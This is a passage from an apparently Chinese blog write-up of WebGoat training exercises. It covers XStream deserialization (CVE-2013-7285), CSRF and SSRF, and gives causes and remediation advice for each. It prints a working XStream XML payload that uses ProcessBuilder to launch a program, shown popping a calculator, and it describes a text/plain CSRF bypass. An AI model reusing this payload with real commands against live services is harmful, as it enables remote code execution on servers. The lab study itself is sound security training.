class=\"string\">&quot;&quot;</span>).replace(<span class=\"string\">&quot;&gt; &quot;</span>, <span class=\"string\">&quot;&gt;&quot;</span>).replace(<span class=\"string\">&quot; &lt;&quot;</span>, <span class=\"string\">&quot;&lt;&quot;</span>);        \t&#125;            contact = (Contact) xstream.fromXML(payload);        &#125; <span class=\"keyword\">catch</span> (Exception ex) &#123;            <span class=\"keyword\">return</span> failed(<span class=\"keyword\">this</span>).feedback(<span class=\"string\">&quot;vulnerable-components.close&quot;</span>).output(ex.getMessage()).build();        &#125;                <span class=\"keyword\">try</span> &#123;            <span class=\"keyword\">if</span> (<span class=\"keyword\">null</span>!=contact) &#123;            \tcontact.getFirstName();<span class=\"comment\">//trigger the example like https://x-stream.github.io/CVE-2013-7285.html            &#125;             if (!(contact instanceof ContactImpl)) &#123;            \treturn success(this).feedback(&quot;vulnerable-components.success&quot;).build();            &#125;        &#125; catch (Exception e) &#123;        \treturn success(this).feedback(&quot;vulnerable-components.success&quot;).output(e.getMessage()).build();        &#125;</span></span><br></pre></td></tr></table></figure>\n<p>实例案例中，可以通过构造 xml 格式的数据，造成 rce</p>\n<p>第三方漏洞修复建议：更新到最新版本，或者打补丁</p>\n<p>测试截图：</p>\n<p>payload：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;sorted-set&gt;  &lt;string&gt;foo&lt;/string&gt;  &lt;dynamic-proxy&gt;    &lt;<span class=\"class\"><span class=\"keyword\">interface</span>&gt;<span class=\"title\">java</span>.<span class=\"title\">lang</span>.<span class=\"title\">Comparable</span>&lt;/<span class=\"title\">interface</span>&gt;    &lt;<span class=\"title\">handler</span> <span class=\"title\">class</span></span>=<span class=\"string\">&quot;java.beans.EventHandler&quot;</span>&gt;      &lt;target <span class=\"class\"><span class=\"keyword\">class</span></span>=<span class=\"string\">&quot;java.lang.ProcessBuilder&quot;</span>&gt;        &lt;command&gt;          &lt;string&gt;cacl.exe&lt;/string&gt;        &lt;/command&gt;      &lt;/target&gt;      &lt;action&gt;start&lt;/action&gt;    &lt;/handler&gt;  &lt;/dynamic-proxy&gt;&lt;/sorted-set&gt;</span><br></pre></td></tr></table></figure>\n<p>成功弹出计算器</p>\n<p><img src=\"301.png\" alt=\"\"></p>\n<h1 id=\"csrf\"><a class=\"markdownIt-Anchor\" href=\"#csrf\">#</a> CSRF</h1>\n<h2 id=\"漏洞描述-10\"><a class=\"markdownIt-Anchor\" href=\"#漏洞描述-10\">#</a> 漏洞描述</h2>\n<p>CSRF（Cross-site request forgery）跨站请求伪造，也被称为 “One Click Attack” 或者 Session Riding，通常缩写为 CSRF 或者 XSRF，是一种对网站的恶意利用。尽管听起来像跨站脚本（XSS），但它与 XSS 非常不同，XSS 利用站点内的信任用户，而 CSRF 则通过伪装来自受信任用户的请求来利用受信任的网站。与 XSS 攻击相比，CSRF 攻击往往不大流行（因此对其进行防范的资源也相当稀少）和难以防范，所以被认为比 XSS 更具危险性。</p>\n<h2 id=\"漏洞成因-9\"><a class=\"markdownIt-Anchor\" href=\"#漏洞成因-9\">#</a> 漏洞成因</h2>\n<p>网站的 cookie 在浏览器中不会过期，只要不关闭浏览器或者退出登录，那以后只要是访问这个网站，都会默认你已经登录的状态。而在这个期间，攻击者发送了构造好的 csrf 脚本或包含 csrf 脚本的链接，可能会执行一些用户不想做的功能</p>\n<h2 id=\"部分代码及修复建议\"><a class=\"markdownIt-Anchor\" href=\"#部分代码及修复建议\">#</a> 部分代码及修复建议</h2>\n<ol>\n<li>\n<p>csrf–&gt;ForgedReviews.createNewReview()</p>\n<p>只判断了 refer 值</p>\n<p><img src=\"csrf1.png\" alt=\"\"></p>\n<p>测试截图：</p>\n<p>bp 一键生成</p>\n<p><img src=\"csrf01.png\" alt=\"\"></p>\n<p><img src=\"csrf02.png\" alt=\"\"></p>\n<p>修复建议：</p>\n<ol>\n<li>\n<p>在服务器端生成随机 token，浏览器在发起针对数据的修改请求将 token 提交，由服务器端验证通过够进行操作逻辑，token 需要至多一次有效，并具有有限的生命周期</p>\n</li>\n<li>\n<p>通过检查 refer 值，判断请求是否合法 (下面的代码就是典型的反例)</p>\n</li>\n<li>\n<p>针对需要用户授权的请求，提示用户输入身份认证后再继续操作</p>\n</li>\n<li>\n<p>针对频繁操作提示输入验证码后再继续进行操作</p>\n</li>\n</ol>\n</li>\n<li>\n<p>csrf–&gt;CSRFFeedback（7）</p>\n<p>新增判断了 contentType。</p>\n<p>拦截请求包生成的 poc 中，enctype=“text/plain”，我们要发送的 json 格式的数据都被隐藏在 input 的 name 中，其余同上</p>\n<p><img src=\"csrf2.png\" alt=\"\"></p>\n<p>测试截图：</p>\n<p><img src=\"csrf03.png\" alt=\"\"></p>\n</li>\n</ol>\n<h1 id=\"ssrf\"><a class=\"markdownIt-Anchor\" href=\"#ssrf\">#</a> SSRF</h1>\n<h2 id=\"漏洞描述-11\"><a class=\"markdownIt-Anchor\" href=\"#漏洞描述-11\">#</a> 漏洞描述</h2>\n<p>服务端请求伪造攻击（SSRF）也成为跨站点端口攻击，是由于一些应用在 9 向第三方主机请求资源时提供了 URL 并通过传递的 URL 来获取资源引起的，当这种功能没有对协议、网络可信便捷做好限制时，攻击者可利用这种缺陷来获取内网敏感数据、DOS 内网服务器、读文件甚至于可获取内网服务器控制权限等。</p>\n<h2 id=\"漏洞成因-10\"><a class=\"markdownIt-Anchor\" href=\"#漏洞成因-10\">#</a> 漏洞成因</h2>\n<p>服务端提供了从其他服务器应用获取数据的功能，且没有对目标地址做过滤或者限制，比如说从指定 url 地址获取网页文本内容，加载指定地址的图片，文档等等.</p>\n<h2 id=\"代码片段以及修复建议-10\"><a class=\"markdownIt-Anchor\" href=\"#代码片段以及修复建议-10\">#</a> 代码片段以及修复建议</h2>\n<p>两个任务都是根据用户输入的参数，进行判断输入，并没有任何过滤</p>\n<p><img src=\"ssrf1.png\" alt=\"\"></p>\n<p><img src=\"ssrf2.png\" alt=\"\"></p>\n<p>测试截图：</p>\n<p><img src=\"ssrf3.png\" alt=\"\"></p>\n<p><img src=\"ssrf4.png\" alt=\"\"></p>\n<p>修复建议：</p>\n<ol>\n<li>\n<p>禁用不需要的协议。仅仅允许 http 和 https 请求。可以防止 file://,gopher://,<a href=\"ftp://%E7%AD%89%E5%BC%95%E8%B5%B7%E7%9A%84%E9%97%AE%E9%A2%98\">ftp:// 等引起的问题</a></p>\n</li>\n<li>\n<p>统一错误信息，防止利用错误信息来判断远端服务器的端口状态.</p>\n</li>\n<li>\n<p>禁止 302 跳转，或每跳转一次检查新的 host 是否为内网 ip, 后禁止</p>\n</li>\n<li>\n<p>设置 url 名单或者限制内网 ip.</p>\n</li>\n</ol>\n<hr>\n<h1 id=\"最后想说的\"><a class=\"markdownIt-Anchor\" href=\"#最后想说的\">#</a> 最后想说的</h1>\n<p>要好好努力，跟着自己的节奏，会越来越好的 o (￣ε￣*)</p>\n<p>还有还有，谢谢小甜甜一直的陪伴，爱您♡</p>\n",
            "tags": [
                "webgoat"
            ]
        }
    ]
}